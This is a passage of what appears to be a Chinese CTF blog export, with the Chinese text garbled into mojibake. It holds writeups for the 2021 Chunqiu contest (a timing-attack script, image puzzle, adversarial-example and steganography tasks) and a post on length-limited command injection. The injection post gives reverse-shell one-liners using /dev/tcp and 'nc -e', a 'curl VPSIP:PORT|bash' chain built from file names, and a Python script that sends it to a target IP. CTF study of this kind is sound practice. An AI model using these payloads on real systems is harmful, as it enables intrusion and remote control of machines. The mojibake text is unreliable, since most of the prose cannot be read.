0]) b_quicker_count += len([result for result in results if result[0] &gt;= 0]) return a_quicker_count, b_quicker_count async def exploit(): # secret_length = 1 # while get(COMPARISON_CHAR * secret_length) == b\"^_^\": # secret_length += 1 secret_length = 10 logger.info(\"\") logger.info(f\"Secret Length: {secret_length}\") logger.info(\"\") secret = \"\" for _ in range(secret_length): start = time.time() def spaced_secret_guess(guess): return \"*\" * len(secret) + guess + \"*\" * (secret_length - len(secret) - 1) tasks = { char: asyncio.create_task( time_difference( spaced_secret_guess( COMPARISON_CHAR), spaced_secret_guess(char) ) ) for char in SECRET_CHARSET } await asyncio.gather(*tasks.values()) lowest_char_quicker = None lowest_char_quicker_count = float(\"inf\") for char, task in tasks.items(): comparison_quicker_count, char_quicker_count = task.result() if char_quicker_count &lt; lowest_char_quicker_count: lowest_char_quicker = char lowest_char_quicker_count = char_quicker_count logger.info( f\"Tested: {secret + char} -- {comparison_quicker_count} {char_quicker_count}\" ) secret += lowest_char_quicker end = time.time() logger.info(\"\") logger.info(f\"Secret Progress: {secret}\") logger.info(f\"Secret Progress took: {end - start}s\") logger.info(\"\") correct = get(f\"{secret}\") # == b\"CORRECT!\" logger.info(\"\") logger.info(f\"Secret: {secret}\") logger.info(f\"Correct: {correct}\") logger.info(\"\") loop = asyncio.get_event_loop() loop.run_until_complete(exploit()) loop.close() ç„¶è€Œï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘åœ¨ Win10 ä¸‹è·‘ç»“æœå±…ç„¶æ²¡å•¥åŒºåˆ«ï¼ŒçœŸçš„ä¸¤ä¸ªä¸åŒå­—æ¯çš„è¯·æ±‚å‘å‡ºå»ç»“æœå‡ ä¹å¯¹åŠåˆ†ï¼Œå–µå–µå–µï¼Ÿ æœ€åå¹²è„†ç›´æ¥åˆ° Ubuntu ä¸‹æ‹‰ docker é•œåƒæœ¬åœ°å…ˆå¤ç°äº†ä¸€éï¼Œå‘ç°åœ¨ Ubuntu ä¸‹å°±æ²¡é—®é¢˜ï¼Œæ¢ Win10 æ‰“è¿‡å»ä¸è¡Œã€‚ äºæ˜¯å¹²è„† Docker èµ·ä¸ª exploit æ‰“è¿œç¨‹å¥½äº†ã€‚ï¼ˆè®°å¾—æ”¹ exploit.pyï¼‰ docker build -t spaceless-spacing-exploit -f Dockerfile.exploit . docker run -it --rm --network=host -e TARGET='http://8.140.110.118:80' spaceless-spacing-exploit å¤šè¯•å‡ æ¬¡ï¼Œæˆ–è€…å†æŠŠ TIMING_ITERATIONSï¼ŒNUM_REQUEST_PAIRS æ”¹å¤§ä¸€ç‚¹ã€‚ f865c31f7e f160cddbc9 fe65c0d8ab 311fc0d2c9 81f3ccd8c9 f16522c8c9 f165c0d8c9 f1d5c3d8cc æ¯”è¾ƒä¸€ä¸‹ï¼Œå†è¯•ä¸€è¯•ï¼Œå¾—å‡º f165c3d8c9 curl --http2-prior-knowledge http://8.140.110.118/ -v -d \"secret=f165c3d8c9\" å¾—åˆ° flagã€‚ flag{a8a00a86-46cb-4959-8b26-e4c8cf15b375} puzzle æ‹¼å›¾çš„å¥½å¤„ï¼š 1ã€åŠ¨æ‰‹åˆåŠ¨è„‘ï¼Œå¼€å‘æ™ºåŠ›ï¼Œå¢åŠ å‡ ä½•ç©ºé—´æ„Ÿ 2ã€ä½ å¯ä»¥åœ¨æ‹¼å¥½åçš„ä½œå“ä¸Šå‘æŒ¥æƒ³è±¡ï¼Œç»˜ä¸Šä¸ä¼—ä¸åŒçš„è‰²å½©ï¼Œè¿™æ ·ï¼Œä½ çš„ä½œå“å°±æˆäº†ç‹¬ä¸€æ— äºŒçš„è‰ºæœ¯å“äº†ã€‚ 3ã€ä¸å®¶äººæˆ–æœ‹å‹ä¸€èµ·æ‹¼è£…ï¼Œå¢åŠ äº†äº¤æµï¼Œå¢è¿›æ„Ÿæƒ…ä¸äº²æƒ… è¿™ä¹ˆå¤šçš„ç›Šå¤„ï¼Œæ‰€ä»¥èµ¶ç´§æ¥ç©å§~ raw: 1920x1080 piece: 160x120 12x9 ä½†æ˜¯ç»™äº†1125å¼ ç¢ç‰‡ï¼Œå¯è§å·¨å¤šå†—ä½™æ•°æ®ï¼Œå‘ç°æ˜¯æ¯ç§»åŠ¨ä¸€ç‚¹æˆªä¸€å¼ è¿™æ ·çš„ï¼Œå¤ªåäº†ã€‚ é£æ ¼æ˜¯è¿™æ ·çš„ã€‚ å½“ç„¶åŸå›¾è¿˜ä¸é”™ã€‚ äºæ˜¯å…ˆæŠŠå¸¦æœ‰å­—ç¬¦çš„å›¾ç‰‡æŒ‘é€‰å‡ºæ¥ï¼Œç„¶åæ‰“å¼€ PPTï¼Œå¼€å§‹æ‹¼å›¾ã€‚ åŠ äº†ä¸€å †å™ªå£°ï¼Œå¤ªåäº†ï¼ï¼ï¼ å ä¸ŠåŸå›¾çœ‹çœ‹ã€‚ è°ƒä¸€ä¸‹é¢œè‰²â€¦â€¦ å¤ªéš¾å—äº†å•Šï¼ å†è¯•è¯•åè‰²å’ŒäºŒå€¼åŒ–ã€‚ import os from PIL import Image import cv2 os.chdir(\"/path/to/the/puzzle/\") filename = os.listdir(\"output/\") # è·å–ç›®å½•ä¸‹æ‰€æœ‰å›¾ç‰‡å # print(filename) # os.listdir() # æ–¹æ³•ç”¨äºè¿”å›æŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨ã€‚ base_dir = \"output/\" # input new_dir = \"threshold/\" # output for img in filename: name = img print(img) img = cv2.imread(base_dir + str(img)) height,width,temp = img.shape img2 = img.copy() for i in range(height): for j in range(width): # åè‰² img2[i,j] = (255-img[i,j][0],255-img[i,j][1],255-img[i,j][2]) cv2.imwrite(new_dir + name, img2) # Grayimg = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) # cv2.imwrite(new_dir + name, Grayimg) # äºŒå€¼åŒ– # ret, thresh = cv2.threshold(Grayimg, 60, 255, cv2.THRESH_BINARY) # cv2.imwrite(new_dir + name, thresh) åæ¥åˆå†ç¾¤å‹æç¤ºä¸‹ï¼Œå®ç°äº†ç”¨ Photoshop æ‰¹é‡å¤„ç†ã€‚ï¼ˆå­¦å¤š å½“ç„¶æœ€åè¿˜æ˜¯æ²¡æ‰¾å…¨/æ²¡è¯•å¯¹ï¼Œçœ¼ç›è¦çäº†â€¦â€¦ æœ€åçš„ flag æ˜¯è¿™ä¸ªâ†“ï¼Œå­—æ¯é•¿å¾—å¤ªä¸‘äº†ï¼Œå›¾ç‰‡å¤ªèŠ±äº†ï¼ŒçœŸè®¤ä¸å‡ºæ¥ã€‚ã€‚ flag{w9w45my6x8kk4e8gp9nqm6j2c154wad49} ï¼ˆè¶Šæƒ³è¶Šè§‰å¾—ï¼Œè¿™ç§æ‹¼å›¾é¢˜ç›®çœŸæ²¡å•¥æ„æ€ old_driver éšç€æ·±åº¦å­¦ä¹ æŠ€æœ¯çš„å‘å±•ï¼ŒåŸºäºæ·±åº¦å­¦ä¹ æŠ€æœ¯çš„è‡ªåŠ¨é©¾é©¶å·²ç»æˆä¸ºäº†å½“ä¸‹ä¸€å¤§çƒ­é—¨ã€‚ä½†æ·±åº¦å­¦ä¹ å¾ˆå®¹æ˜“å—åˆ°å¯¹æŠ—æ ·æœ¬çš„æ”»å‡»ï¼Œè¿™ä¹Ÿä¼šä¸ºè‡ªåŠ¨é©¾é©¶å¸¦æ¥å®‰å…¨éšæ‚£ã€‚é™„ä»¶ä¸­ç»™å‡ºäº†ä¸€ä¸ªè·¯æ ‡è¯†åˆ«ç³»ç»Ÿçš„æ¨¡å‹å’Œä¸€äº›è¾“å…¥çš„è·¯æ ‡å›¾ç‰‡ï¼Œåœ¨è¾“å…¥çš„è·¯æ ‡ä¸­è¢«é»‘å®¢æ··å…¥äº†ä¸€äº›å¯¹æŠ—æ ·æœ¬ï¼Œä½ èƒ½å¦å¸®å¿™æ£€æµ‹å‡ºå…¶ä¸­çš„å¯¹æŠ—æ ·æœ¬å‘¢ï¼Ÿ Note: æ•°æ®é›†æ–‡ä»¶å¤¹åä¸ºground truth labelï¼Œè€Œä¸æ˜¯æ¨¡å‹è¾“å‡ºã€‚ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰ åˆæ˜¯ AI é¢˜å•Šï¼ˆï¼ˆ ï¼ˆè¿™é¢˜æ¯”èµ›çš„æ—¶å€™æ²¡æ€ä¹ˆçœ‹ï¼Œæ¥å¤ç°ä¸€ä¸‹ attack.py æºç  from glob import glob import torch from torch import nn, optim import torch.nn.functional as F import torchattacks # https://github.com/Harry24k/adversarial-attacks-pytorch from torchvision import transforms from PIL import Image import random import os from hashlib import md5, sha256 class Model(nn.Module): def __init__(self): super(Model, self).__init__() self.conv1 = nn.Conv2d(3, 100, 5) self.conv1_bn = nn.BatchNorm2d(100) self.pool = nn.MaxPool2d(2, 2) self.conv2 = nn.Conv2d(100, 150, 3) self.conv2_bn = nn.BatchNorm2d(150) self.conv3 = nn.Conv2d(150, 250, 1) self.conv3_bn = nn.BatchNorm2d(250) self.fc1 = nn.Linear(250 * 3 * 3, 350) self.fc1_bn = nn.BatchNorm1d(350) self.fc2 = nn.Linear(350, 10) self.dropout = nn.Dropout(p=0.5) def forward(self, x): x = self.pool(F.elu(self.conv1(x))) x = self.dropout(self.conv1_bn(x)) x = self.pool(F.elu(self.conv2(x))) x = self.dropout(self.conv2_bn(x)) x = self.pool(F.elu(self.conv3(x))) x = self.dropout(self.conv3_bn(x)) x = x.view(-1, 250 * 3 * 3) x = F.elu(self.fc1(x)) x = self.dropout(self.fc1_bn(x)) x = self.fc2(x) return x # load pretrained model device = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\") transform = transforms.ToTensor() model = Model().to(device) check_point = torch.load('model.pt', map_location=device) model.load_state_dict(check_point) model.eval() # untargeted CW attack atk = torchattacks.CW(model, c=1, kappa=0.3) # generate an adversarial example for each class pairs = [] for cl in range(10): while True: origin_image = random.choice(glob(f'test/{cl}/*.png')) image = transform(Image.open(origin_image)).to(device)[None, ...] label = torch.tensor(cl, device=device) adv_image = atk(image, label) origin_output = model(image) adv_output = model(adv_image) origin_label = torch.argmax(origin_output, axis=1).item() adv_label = torch.argmax(adv_output, axis=1).item() if adv_label == origin_label: continue transforms.ToPILImage()(adv_image[0]).save(f'adv_{origin_label}_{adv_label}.png') # confirm that the generated adversarial example is working image = transform(Image.open(f'adv_{origin_label}_{adv_label}.png')).to(device)[None, ...] output = model(image) if torch.argmax(output, axis=1).item() != adv_label: continue pairs.append((origin_image, f'adv_{origin_label}_{adv_label}.png', origin_label, adv_label)) break # remove origin images and move adversarial examples into target classes for origin_fname, adv_fname, origin_label, adv_label in pairs: os.rename(adv_fname, f'test/{adv_label}/{adv_fname}') os.remove(origin_fname) # shuffle all the images to hide adversarial examples os.mkdir('imgs') adversarial_images = [] for cl in range(10): images = glob(f'test/{cl}/*.png') os.mkdir(f'imgs/{cl}') random.shuffle(images) for idx, image in enumerate(images): os.rename(image, f'imgs/{cl}/{idx}.png') if 'adv' in image: adversarial_images.append(idx) # You can get the flag if you find all the adversarial examples :) flag = 'flag{' + md5(str(sorted(adversarial_images)).encode()).hexdigest() + '}' # Give you some hints though you can solve this challenge without them hint1 = [(row[2], row[3]) for row in pairs] hint2 = sha256(str(sorted(adversarial_images)).encode()).hexdigest() print('flag:', flag) print('hint1:', hint1) print('hint2:', hint2) # flag: flag{*********REDACTED**********} # hint1: [(0, 1), (1, 0), (2, 6), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7), (9, 1)] # hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9 å¯ä»¥çœ‹åˆ°ç”¨ Pytorch æ­äº†ä¸€ä¸ªæ¨¡å‹ï¼Œç”Ÿæˆå¯¹æŠ—æ ·æœ¬ï¼Œç„¶åç¡®ä¿ç”Ÿæˆçš„æ ·æœ¬è½å…¥åˆ°æ¨¡å‹çš„å¦ä¸€ä¸ªåˆ†ç±»ä¸­ï¼Œè€Œåå°†å¯¹æŠ—æ ·æœ¬ä¿å­˜ï¼Œæ”¹åå¹¶ç§»é™¤åŸå›¾ã€‚ ï¼ˆé¡ºæ‰‹æŠŠ Pytorch è£…äº†ï¼Œå–µå‘œï¼Œæœ‰ç‚¹å¤§è¿˜æŒºä¹… pairs æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œåˆ†åˆ«æ˜¯ (origin_fname, adv_fname, origin_label, adv_label)ï¼Œå³åŸå›¾å’Œå¯¹æŠ—æ ·æœ¬çš„æ–‡ä»¶è·¯å¾„ã€ç›¸åº”çš„æ ‡ç­¾ã€‚ çœ‹ä¸€ä¸‹ imgs/ ç›®å½•ä¸‹çš„å›¾ç‰‡ï¼Œè¿™ä¸ªå±…ç„¶çœŸçš„è‚‰çœ¼å°±èƒ½æ‰¾å‡ºåŒºåˆ«â€¦â€¦ å°½ç®¡æ‰“ä¹±äº†å›¾ç‰‡çš„é¡ºåºï¼Œä½†æ˜¯ç”±äº rename å¹¶æ²¡æœ‰å½±å“æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ï¼Œè€Œè¿™äº›å¯¹æŠ—æ ·æœ¬æ˜¯åé¢ä¿å­˜/åˆ›å»ºçš„ï¼Œäºæ˜¯ç›´æ¥æŒ‰ç…§æ—¶é—´æ’åºå°±èƒ½æ‰¾å‡ºæ˜¯å“ªäº›å¯¹æŠ—æ ·æœ¬ã€‚è¿™ä¹Ÿæ˜¯å¾ˆå¤šéé¢„æœŸè§£çš„æ–¹æ³•ã€‚ è¯•äº†ä¸€ä¸‹ï¼Œæœç„¶å¯ä»¥â€¦â€¦ Exp: from hashlib import md5, sha256 # flag: flag{*********REDACTED**********} # hint1: [(0, 1), (1, 0), (2, 6), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7), (9, 1)] # hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9 adversarial_images = [34, 171, 128, 116, 273, 293, 214, 391, 59, 127] hint2 = sha256(str(sorted(adversarial_images)).encode()).hexdigest() print('hint2:', hint2) flag = 'flag{' + md5(str(sorted(adversarial_images)).encode()).hexdigest() + '}' print('flag:', flag) # hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9 # flag: flag{00d531934c171e1a71405f5e1f171d65} é¢„æœŸè§£å¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡ æ˜¥ç§‹æ¯2021æ–°å¹´æ¬¢ä¹èµ›aié¢˜old_driverè¯¦è§£ ä¸»è¦æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼š è¯†åˆ«ç»“æœå‰ä¸¤åè¯„åˆ†å·®è·å° è¯†åˆ«ç»“æœç¬¬äºŒåè¯„åˆ†é«˜ å¯¹ç…§ hint1ï¼Œè¯„åˆ†å‰ä¸¤åæ˜¯å·²çŸ¥çš„ =&gt; ä¸æ­£ç¡®çš„è·³è¿‡ åœ¨ä»–çš„ exp åŸºç¡€ä¸Šç¨å¾®æ”¹äº†ä¸‹ï¼Œå¤ç°æˆåŠŸã€‚ 2019-nCoV å¢åŠ hint.txtä¸‹è½½ å¯ç”¨pythonç»Ÿè®¡æ¬¡æ•°æœ€å¤šçš„å­—ç¬¦ è€å¥—å¨ƒé¢˜äº†ï¼Œæ¥å¤ç°ä¸€ä¸‹ã€‚ hint.txt NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE====== base32 =&gt; http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.html https://www.ncbi.nlm.nih.gov/orffinder/ http://www.merrybio.com.cn/blog/coronavirus-introduction.html Please notice The largest structural protein the password is the md5(it's gene sequence) and do not let the â€˜\\nâ€™ in md5() å…³æ³¨æœ€å¤§çš„ç»“æ„è›‹ç™½ï¼Œpassword æ˜¯åŸºå› åºåˆ—çš„ md5ã€‚ å»çœ‹ç™»å½•å·ä¸º MN908947 çš„å…¨åŸºå› ç»„åºåˆ—ã€‚ æŒ‰ç…§ç¬¬ä¸€ç¯‡ä¸­çš„æ€è·¯ï¼Œåˆ©ç”¨ NCBI ä¸Šçš„ ORF finder å·¥å…·å¯¹è¯¥ç—…æ¯’ï¼ˆMN908947) è¿›è¡ŒåŸºå› ç»„æ³¨é‡Šåˆ†æã€‚ $ cat protein.txt|awk '{printf(\"%s\",$0)}'|md5sum 98eb1b1760bcc837934c8695a1cee923 *- MP3stego è§£ cov.mp3 MP3StegoDecode.exe -X -P 98eb1b1760bcc837934c8695a1cee923 cov.mp3 å¾—åˆ° realflag.zip å¯†ç  2019-nCoVã€‚ è§£å‹ =&gt; hint2.txt ä»¥åŠ CoV-1.jpg 796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154 base16 =&gt; you must pay attention to N protein ,How do that get into the viral capsid? do you know steghide? the password is encrypt by VigenÃ¨re Cipher the screct key is The top 20 characters with the most occurrences are counted+COMBAT å†å›åˆ°ç¬¬ä¸€å¼ å›¾é‡Œçš„ æ ¸è¡£å£³è›‹ç™½ï¼ˆnucleoproteinï¼ŒNï¼‰ï¼Œå®ƒå¦‚ä½•è¿›å…¥ç—…æ¯’è¡£å£³å†…ï¼Ÿ è¦ç»“åˆ Mã€Eè›‹ç™½ã€‚ è¿™é‡Œå¥½å‘å•Šï¼Œè¦æŠŠè¿™ä¸‰ä¸ªè›‹ç™½ä¸€èµ·åˆå¹¶ã€‚ ç»Ÿè®¡ä¸€ä¸‹å‡ºç°æ¬¡æ•°æœ€å¤šçš„20ä¸ªå­—ç¬¦ã€‚ s = \"\"\"MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA SWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK MKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN PANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG SSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS AAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH WPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV ILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL DDFSKQLQQSMSSADSTQA MADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK LIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF RLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLR IAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYR IGNYKLNTDHSSSSDNIALLVQ MFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS QLDEEQPMEID\"\"\" s = s.strip().replace('\\n', '') d = {} for i in s: if i not in d: d[i] = 1 else: d[i] += 1 print(d) # {'M': 14, 'S': 56, 'D': 34, 'N': 37, 'G': 57, 'P': 34, 'Q': 42, 'R': 44, 'A': 57, 'I': 44, 'T': 48, 'F': 27, 'E': 24, 'K': 42, 'L': 70, 'W': 13, 'H': 10, 'V': 23, 'Y': 22, 'C': 4} l = sorted(d.items(), key=lambda x: x[1], reverse=True) print(l) r='' for i in l: r += i[0] print(r[:20]) # LGASTRIQKNDPFEVYMWHC # LGASTRIQKNDPFEVYMWHCCOMBAT ç”¨ SilentEye å¯¹ pass.wav è§£å¯†ä¸€ä¸‹ã€‚ å¾—åˆ° password priebeijoarkjpxmdkucxwdusã€‚ ç„¶åç”¨ å‡ºç°æœ€å¤šçš„20ä¸ªå­—ç¬¦ + COMBATï¼Œå³ LGASTRIQKNDPFEVYMWHCCOMBAT è¿™ä¸ªå¯†é’¥ VigenÃ¨re è§£å¯† passwordã€‚ å¾—åˆ°æœ€ç»ˆçš„ passwordï¼šeliminatenovelcoronavirts æœ€å steghide è§£å¯†å›¾ç‰‡ã€‚ steghide extract -p eliminatenovelcoronavirts -v -sf CoV-1.jpg flag{we_will_over_come_SARS-COV} ï¼ˆè€å¥—å¨ƒäº† è°ƒæŸ¥é—®å· flag{xinnianfunfunfun} å°ç»“è¯´å¥½çš„æ¬¢ä¹èµ›å‘¢ï¼Œæ¬¢ä¹éƒ½æ˜¯ä¸»åŠæ–¹å’Œå‡ºé¢˜äººçš„ï¼Œå˜¤å˜¤å˜¤ï¼Œå¤ªåäº†ï¼ˆ é™¤äº†åå‘ binary ç±»å‹çš„ evilMem å’Œ Super Brainï¼Œè¿˜æœ‰ä¸ª æŒ‰Fæ³¨å…¥ã€‚æ˜¯ä¸ª PostgreSQL çš„æ³¨å…¥ï¼Œè¿˜æ²¡åšè¿‡ç±»ä¼¼çš„å”‰ï¼Œæœ‰ç‚¹æ„æ€ï¼Œåé¢å†æ¥å¤ç°å§ï¼Œå–µå–µ~ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/02/03/CTF_2021chunqiu/"},{"title":"CTF | é™åˆ¶é•¿åº¦ä¸‹çš„å‘½ä»¤æ‰§è¡Œ æŠ€å·§æ±‡æ€»","text":"å‰è¨€æœ€è¿‘æ‰“ CTF çš„æ—¶å€™é‡åˆ°äº†ä¸ª å‘½ä»¤æ‰§è¡Œ çš„ web é¢˜ç›®ï¼Œä½†æ˜¯å®ƒé™åˆ¶äº†å‘½ä»¤çš„é•¿åº¦ã€‚ äºæ˜¯æŸ¥äº†ä¸€äº›èµ„æ–™ï¼Œæ­£å¥½å°±æ¥æ€»ç»“ä¸€ä¸‹ä¸€äº›ç›¸å…³çš„å°æŠ€å·§å§ï¼Œå–µ~ é»˜è®¤æ’åºls é»˜è®¤çš„æ’åºæ˜¯æŒ‰ç…§å­—æ¯é¡ºåºæ¥çš„ï¼Œä¸€ä¸ªä¸€ä¸ªå­—ç¬¦æ¥çœ‹ï¼Œ| =&gt; ç©ºæ ¼ =&gt; æ•°å­— =&gt; å­—æ¯ã€‚ ä»¥ - å¼€å¤´çš„æ–‡ä»¶åä¸çœ‹ -ï¼Œä»ä¹‹åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æ¯”è¾ƒã€‚ ä¸€äº› tricks Linux ä¸‹å¯ä»¥ç”¨ \\ æ¥æ‹¼æ¥å‘½ä»¤ï¼Œå®ç°å‘½ä»¤ç»­è¡Œï¼Œç”Ÿæˆæ–‡ä»¶çš„è¯æ–‡ä»¶åè¦åŒå†™ \\\\ï¼Œæ¯”å¦‚ &gt;ls\\\\ã€‚ æ³¨æ„ä¸è¦ç”¨ . ä½œä¸ºæ–‡ä»¶åçš„å¼€å¤´ï¼Œå› ä¸º Linux ä¸‹ . ä¼šä½œä¸ºéšè—æ–‡ä»¶ï¼Œç›´æ¥ç”¨ ls åˆ—ä¸å‡ºæ¥ã€‚ ä¸ºäº†ä¸æŒ‰ç…§é»˜è®¤é¡ºåºæ’åºï¼Œå¯ä»¥ç”¨ ls -tï¼ŒæŒ‰ç…§æ—¶é—´é¡ºåºï¼Œåæ‰§è¡Œçš„æ’å‰é¢ï¼Œäºæ˜¯å¯ä»¥æ‹†åˆ†å‘½ä»¤å†æ‹¼æ¥æ¥å®ç°ã€‚ dir a b&gt;c åªä¼šå°† a b å†™åˆ°æ–‡ä»¶ c ä¸­ï¼Œè€Œå…¶ä»–çš„æ–‡ä»¶åˆ™ä¸ä¼šã€‚ ç”¨ * å¯ä»¥å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•åŠæ–‡ä»¶åï¼Œè€Œä¸”èƒ½ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤ã€‚ åˆ©ç”¨ rev å‘½ä»¤å¯ä»¥æ‰§è¡Œååºï¼Œå…ˆç”Ÿæˆä¸€ä¸ªåä¸º rev çš„æ–‡ä»¶ï¼Œå†æ‰§è¡Œ *vï¼Œç”±äº Linux çš„é€šé…ç¬¦ï¼Œå°±ç›¸å½“äºæ‰§è¡Œäº† rev vï¼Œå¤ªå¦™äº†ï¼ è¿˜å¯ä»¥ç”¨ ls -thï¼Œ-h ä¸å½±å“æ‰§è¡Œï¼Œä½† ht- å°±èƒ½æ’åˆ° sl å‰é¢å»ï¼Œæ­é… *v ä½¿ç”¨æ›´å¥½äº†ã€‚ -h, â€“human-readable with -l and -s, print sizes like 1K 234M 2G etc. PHP ä»£ç æ‰§è¡Œ exec æ—¶ï¼Œåªéœ€è¦è¾“å…¥\\ å³å¯ç”Ÿæˆ \\\\ï¼Œæ¯”å¦‚ exec(\"&gt;ls\\\") å³å¯ï¼Œè¿˜èƒ½çœä¸€ä¸ªå­—ç¬¦å‘¢ã€‚ åå¼¹ shell æ—¶å€™ç”¨çš„ IP å¯ä»¥æ¢æˆåè¿›åˆ¶ä¸å¸¦å°æ•°ç‚¹çš„ã€‚ï¼ˆå™¢ä½ æœ‰çŸ­åŸŸåå•Šï¼Œæ²¡äº‹äº†ï¼‰ å¯ä»¥ä¾æ¬¡æ‰§è¡Œ &gt;env, *&gt;xï¼Œç›¸å½“äºæ‰§è¡Œ env&gt;xï¼Œå°±èƒ½åœ¨ x æ–‡ä»¶é‡Œå¾—åˆ°ç¯å¢ƒå˜é‡é‡Œçš„å†…å®¹ã€‚ å‚è€ƒ Payloadè¿™ä¸ªæ˜¯åå¼¹ shell çš„æ€è·¯ã€‚ æœ€å¼€å§‹éœ€è¦åœ¨ VPS æŸä¸ªé¡µé¢ä¸Šæ”¾ä¸ªåå¼¹ shell çš„è„šæœ¬ã€‚ bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1 # æˆ–è€… nc -e /bin/sh VPSIP PORT ç„¶åèµ·ä¸ªæœåŠ¡ç›‘å¬è¿™ä¸ªç«¯å£ã€‚ nc -lvvp PORT è¦è¢«æ‰“çš„æœºå™¨ä¸Šï¼Œå…ˆç”Ÿæˆ ls -th &gt; gï¼Œè€Œåæ–‡ä»¶åæ‹¼æ¥å®ç° curl VPSIP:PORT|bashï¼Œç„¶åæ‰§è¡Œ sh x ç”Ÿæˆåå¼¹çš„å‘½ä»¤ï¼Œæœ€å sh g è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåœ¨ VPS ä¸Šæ‹¿åˆ° shellã€‚ # coding: utf-8 import requests from urllib.parse import quote baseurl = \"http://207.180.200.166:8000/?cmd=\" reset = \"http://207.180.200.166:8000/?reset\" s = requests.session() s.get(reset) # æ–‡ä»¶ x å†…å®¹ä¸º ls -th &gt; g list1 = [ \"&gt;sl\", \"&gt;ht-\", \"&gt;g\\&gt;\", \"&gt;dir\", \"*&gt;v\", \"&gt;rev\", \"*v&gt;x\" ] # curl VPSIP:PORT|bash list2 = [ \"&gt;bash\", \"&gt;\\|\\\\\", \"&gt;11\\\\\", \"&gt;11\\\\\", \"&gt;1:\\\\\", \"&gt;11\\\\\", \"&gt;1.\\\\\", \"&gt;11\\\\\", \"&gt;11.\\\\\", \"&gt;11.\\\\\", \"&gt;\\ \\\\\", \"&gt;rl\\\\\", \"&gt;cu\\\\\" ] for i in list1: url = baseurl + quote(str(i)) print(\"sending\", quote(i)) r = s.get(url) print('==&gt;', r.text) for j in list2: url = baseurl + quote(str(j)) print(\"sending\", quote(j)) r = s.get(url) print('==&gt;', r.text) print('sh x') r = s.get(baseurl+quote(\"sh x\")) r.encoding = 'utf-8' print('==&gt;', r.text) print('sh g') r = s.get(baseurl+quote(\"sh g\")) r.encoding = 'utf-8' print('==&gt;', r.text) s.get(reset) å‚è€ƒé¢˜ç›®0x41414141 CTF 2021 hackme: CTF | 2021 0x41414141CTF éƒ¨åˆ† WriteUp HITCON 2017 BabyFirst Revenge: HITCON 2017 CTF BabyFirst Revenge è¿™ä¸ªç”¨ tar å‹ç¼©å¾—åˆ°æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼Œä¸è¿‡å‰ææ˜¯å½“å‰ç›®å½•çš„æ–‡ä»¶èƒ½ä¸‹è½½ï¼Œphp å€’æ˜¯å¯ä»¥ã€‚ Baby First Revenge v2 (GitHub) é‡Œé¢è¿˜æœ‰ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„æ“ä½œï¼ˆ ä»¥åŠä¸€äº› æ±‡æ€»ï¼š ä¸»è¦ä¹Ÿæ˜¯ HITCON 